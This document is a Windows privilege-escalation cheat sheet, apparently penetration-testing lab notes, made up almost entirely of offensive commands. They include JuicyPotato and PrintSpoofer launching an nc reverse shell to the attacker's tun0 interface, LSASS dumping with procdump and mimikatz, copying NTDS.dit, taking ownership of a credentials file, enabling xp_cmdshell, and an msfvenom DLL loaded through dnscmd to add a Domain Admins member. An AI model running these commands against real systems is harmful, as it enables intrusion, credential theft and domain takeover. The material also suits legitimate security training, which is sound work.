## Windows

### Network
```powershell
ipconfig /all
arp -a
route print
netstat -ano
netstat -anoy
```

### Check users & group
```powershell
query user
echo %USERNAME%
whoami /all
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net accounts
wmic useraccount where name="netadm" get sid
```

### Defender & AppLocker
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Process & Installed programs
```powershell
tasklist /svc
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version
```

### Environnement
```powershell
set
systeminfo
wmic qfe
Get-HotFix | ft -AutoSize
pipelist.exe /accepteula
systeminfo
```

### Files and folder & ACLs
```powershell
dir /q C:\backups\wwwroot\web.config
# Change Ownership of file
takeown /f C:\backups\wwwroot\web.config
Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}
icacls "C:\backups\wwwroot\web.config" /grant htb-student:F
# Copy NTDS.dit
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
# Check for security logs event
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
# Checl powershell log
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### Named Pipes
```powershell
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### SeImpersonate and SeAssignPrimaryToken
```powershell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe tun0 8443 -e cmd.exe" -t *
PrintSpoofer.exe -c "c:\tools\nc.exe tun0 8443 -e cmd"
```

### SeDebugPrivilege
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe log
mimikatz.exe sekurlsa::logonpasswords
mimikatz.exe sekurlsa::minidump lsass.dmp
```

### SeTakeOwnershipPrivilege
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

### MSSQL
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
```

### RDP
```bash
xfreerdp /d:"$DOMAIN" /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore /drive:"share,. /dynamic-resolution"
xfreerdp /u:"$USER" /p:"$PASSWORD" /v:"$TARGET" /cert-ignore /drive:"share,. /dynamic-resolution"
```

### Metasploit Framework
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### DNS Admin
```powershell
dnscmd.exe /config /serverlevelplugindll adduser.dll
sc.exe sdshow DNS
sc stop dns
sc start dns
sc query dns
```

### Registry key
```powershell
reg query \$TARGET\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\$TARGET\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```